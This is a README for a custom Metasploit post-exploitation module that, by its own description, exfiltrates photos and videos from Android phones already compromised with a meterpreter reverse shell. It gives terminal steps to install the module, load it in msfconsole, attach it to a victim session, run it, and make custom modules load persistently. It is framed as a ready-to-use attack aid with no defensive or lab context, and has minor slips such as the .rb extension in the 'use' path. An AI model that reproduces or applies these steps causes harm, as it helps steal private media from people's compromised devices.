# upload_and_execute
this file is made for use with msfconsole for post exploitation<br>
this exploitation is used for android photos and videos exfiltration<br>
after exploiting android with android/meterpreter/reverse_tcp<br>
go to ~/.msf4/modules/post/ <br>
/or/ /usr/share/metasploit-framework/modules/post/<br>
If the post/ directory doesn’t exist inside ~/.msf4/modules/, create it:<br>

mkdir -p ~/.msf4/modules/post/custom<br>#terminal

then copy upload_and_execute.rb inside custom file<br>

After saving the script, reload Metasploit to detect the new module:<br>

msfconsole -q -x "reload_all" #terminal<br>

Alternatively, start msfconsole and manually reload:<br>

msfconsole        #terminal <br>
msf6 > reload_all<br>  #terminal<br>

 ****** Use the Custom Module ****** | <br>

Inside msfconsole, search for your custom post module:<br>

msf6 > search custom  #terminal<br>

Then, load and use it:<br>

msf6 > use post/custom/upload_and_execute.rb    #terminal<br>
msf6 post(custom/upload_and_execute.rb) > show options   #terminal <br>

Set the session ID:<br>

msf6 post(custom/upload_and_execute.rb) > set SESSION 1  #terminal<br>

Run the exploit:<br>

msf6 post(custom/upload_and_execute.rb) > run<br>

******(Optional) Persisting Custom Modules******<br>

If you want Metasploit to always load custom modules from ~/.msf4/modules/, add this line to your .bashrc or .zshrc:<br>

export MSF_MODULE_PATH=~/.msf4/modules #terminal  <br>

Then reload your shell:<br>

source ~/.bashrc  # or source ~/.zshrc   #terminal <br> 

